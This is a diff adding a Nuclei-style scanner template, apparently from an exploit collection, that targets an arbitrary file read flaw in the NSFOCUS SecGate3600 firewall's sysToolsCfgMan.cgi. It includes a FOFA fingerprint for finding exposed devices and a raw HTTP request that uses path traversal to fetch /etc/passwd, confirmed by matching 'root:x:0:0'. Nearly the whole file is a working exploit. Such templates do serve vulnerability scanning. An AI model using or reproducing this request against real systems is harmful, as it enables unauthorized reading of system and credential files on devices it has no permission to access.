@@ -1,0 +1,28 @@
+id: nsfocus-secgate3600-systoolscfgman-lfi
+
+info:
+  name: "网神 SecGate3600 sysToolsCfgMan.cgi 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="sec_gate_image/login_02.gif" fid="ldb0WVBlAgZloMw9AAge0A=="
+      该漏洞源于目标系统中sysToolsCfgMan.cgi组件未正确实施文件访问控制机制，攻击者可通过构造特定请求路径，绕过预期的安全限制读取系统上的任意文件内容。此缺陷可能被利用获取敏感配置信息、系统文件或执行其他高危操作。
+  tags: 网神 SecGate3600
+
+http:
+- raw:
+  - |
+    GET /cgi-bin/sysTools/sysToolsCfgMan.cgi?controlType=exportConfig&fileName=/../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
